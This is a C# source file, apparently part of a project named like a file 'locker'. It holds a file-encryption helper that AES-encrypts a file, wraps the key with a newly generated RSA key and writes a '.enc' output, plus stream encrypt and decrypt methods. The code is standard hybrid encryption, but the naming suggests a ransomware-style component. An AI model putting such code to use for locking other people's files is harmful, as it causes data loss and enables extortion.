using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;

namespace s0s_L_ckr
{
    /*
  ____|                                   |   _)               
  __|    __ \    __|   __|  |   |  __ \   __|  |   _ \   __ \  
  |      |   |  (     |     |   |  |   |  |    |  (   |  |   | 
 _____| _|  _| \___| _|    \__, |  .__/  \__| _| \___/  _|  _| 
   ___|                 _| _)__/  _|                           
  |       _ \   __ \   |    |   _` |                           
  |      (   |  |   |  __|  |  (   |                           
 \____| \___/  _|  _| _|   _| \__, |                           
                              |___/                            

     */
    public sealed class CriptoFilMgr
    {
        private CriptoFilMgr(){ }

        [MethodImpl(MethodImplOptions.AggressiveInlining)]
        public static void Encrypt(Stream stream, ref byte[] srceDat)
        {
            //ICryptoTransform - Defines the basic operations of cryptographic transformations.
            //Cryptographic interface
            try
            {
                using (ICryptoTransform cryptoTransform = CriptoKeyMgr.CURR_AES_ENC_ENG.CreateEncryptor())
                {
                    //Defines a stream that links data streams to cryptographic transformations.
                    using (CryptoStream cryptoStream = new CryptoStream(stream, cryptoTransform, CryptoStreamMode.Write))
                    {
                        /********************************
                         * CryptoStream(Stream, 
                         *              ICryptoTransform, 
                         *              CryptoStreamMode)
                         *******************************/
                        cryptoStream.Write(srceDat, 0, srceDat.Length);
                    }
                }
            }
            catch
            {
                throw new NotImplementedException();

            }

        }

        [MethodImpl(MethodImplOptions.AggressiveInlining)]
        public static void EncryptFile(string inFile)
        {
            RSACryptoServiceProvider rsa;
            CspParameters cspp = new CspParameters();

                // Create instance of Aes for
                // symmetric encryption of the data.
                Aes aes = Aes.Create();
            ICryptoTransform transform = aes.CreateEncryptor();

            // Use RSACryptoServiceProvider to
            // encrypt the AES key.
            // rsa is previously instantiated:
            rsa = new RSACryptoServiceProvider(cspp);
            byte[] keyEncrypted = rsa.Encrypt(aes.Key, false);

            // Create byte arrays to contain
            // the length values of the key and IV.
            byte[] LenK = new byte[4];
            byte[] LenIV = new byte[4];

            int lKey = keyEncrypted.Length;
            LenK = BitConverter.GetBytes(lKey);
            int lIV = aes.IV.Length;
            LenIV = BitConverter.GetBytes(lIV);

            // Write the following to the FileStream
            // for the encrypted file (outFs):
            // - length of the key
            // - length of the IV
            // - ecrypted key
            // - the IV
            // - the encrypted cipher content

            int startFileName = inFile.LastIndexOf("\\") + 1;
            // Change the file's extension to ".enc"
            string outFile = inFile.Substring(startFileName, inFile.LastIndexOf(".") - startFileName) + ".enc";

            using (FileStream outFs = new FileStream(outFile, FileMode.Create))
            {

                outFs.Write(LenK, 0, 4);
                outFs.Write(LenIV, 0, 4);
                outFs.Write(keyEncrypted, 0, lKey);
                outFs.Write(aes.IV, 0, lIV);

                // Now write the cipher text using
                // a CryptoStream for encrypting.
                using (CryptoStream outStreamEncrypted = new CryptoStream(outFs, transform, CryptoStreamMode.Write))
                {

                    // By encrypting a chunk at
                    // a time, you can save memory
                    // and accommodate large files.
                    int count = 0;
                    int offset = 0;

                    // blockSizeBytes can be any arbitrary size.
                    int blockSizeBytes = aes.BlockSize / 8;
                    byte[] data = new byte[blockSizeBytes];
                    int bytesRead = 0;

                    using (FileStream inFs = new FileStream(inFile, FileMode.Open))
                    {
                        do
                        {
                            count = inFs.Read(data, 0, blockSizeBytes);
                            offset += count;
                            outStreamEncrypted.Write(data, 0, count);
                            bytesRead += blockSizeBytes;
                        }
                        while (count > 0);
                        inFs.Close();
                    }
                    outStreamEncrypted.FlushFinalBlock();
                    outStreamEncrypted.Close();
                }
                outFs.Close();
            }
        }

        internal static void EncryptFile(FileStream fileStream)
        {
            throw new NotImplementedException();
        }

        public static void Decrypt(Stream stream, ref Byte[] fileEnc, int startPos, byte[] key, byte[] iv)
        {
            //ICryptoTransform - Defines the basic operations of cryptographic transformations.
            //Cryptographic interface
            using (ICryptoTransform cryptoTransform = CriptoKeyMgr.CURR_AES_ENC_ENG.CreateDecryptor(key, iv))
            {
                //Defines a stream that links data streams to cryptographic transformations.
                using (CryptoStream cryptoStream = new CryptoStream(stream, cryptoTransform, CryptoStreamMode.Write))
                {
                    cryptoStream.Write(fileEnc, startPos, fileEnc.Length - startPos);
                    cryptoStream.Flush();
                }
            }
        }
    }
}
